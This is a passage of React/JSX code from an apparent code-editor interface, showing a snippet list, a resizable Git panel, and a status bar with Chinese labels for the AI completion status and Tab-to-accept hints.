                            toast.success(`已插入: ${snippet.name}`);
                          }
                        }}>
                        <div className="flex items-center justify-between px-2 py-1.5 bg-[var(--editor-line)]">
                          <span className="text-[10px] text-white font-semibold truncate">{snippet.name}</span>
                          <Badge className="text-[9px] h-3.5 px-1 bg-[var(--primary)] text-white shrink-0">{snippet.lang}</Badge>
                        </div>
                        <pre className="text-[9px] text-[var(--sidebar-fg)] p-2 overflow-hidden max-h-14 leading-4 group-hover:text-[var(--editor-fg)] transition-colors">
                          {snippet.code.slice(0, 100)}...
                        </pre>
                      </div>
                    ))}
                  </div>
                </ScrollArea>
              </div>
            </ResizablePanel>
          </>
        )}

        {/* Git Panel */}
        {showGit && (
          <>
            <ResizableHandle className="bg-[var(--editor-border)] w-px" />
            <ResizablePanel defaultSize={18} minSize={14} maxSize={28}>
              <GitPanel visible={showGit} />
            </ResizablePanel>
          </>
        )}
      </ResizablePanelGroup>

      {/* Status Bar */}
      <div className="flex items-center gap-4 px-3 py-1 bg-[var(--primary)] text-white text-[10px] shrink-0">
        <span className="flex items-center gap-1"><GitBranch className="w-3 h-3" />main</span>
        <span className="font-mono">{activeFile?.language?.toUpperCase()}</span>
        <span>UTF-8 · LF</span>
        <span className="flex items-center gap-1">
          <Sparkles className={cn("w-3 h-3", aiEnabled ? "text-purple-300" : "opacity-40")} />
          {aiEnabled ? "AI 补全已启用" : "AI 补全已禁用"}
        </span>
        {(aiLoading || completionLoading) && (
          <span className="flex items-center gap-1 ml-auto">
            <RefreshCw className="w-3 h-3 animate-spin" />
            AI 处理中...
          </span>
        )}
        {ghostText && !aiLoading && (
          <span className="flex items-center gap-1 ml-auto text-purple-200">
            <Sparkles className="w-3 h-3" />
            按 Tab 接受补全
          </span>
        )}
        <span className="ml-auto text-white/70">Ln 1, Col 1</span>
      </div>
    </div>
  );
}
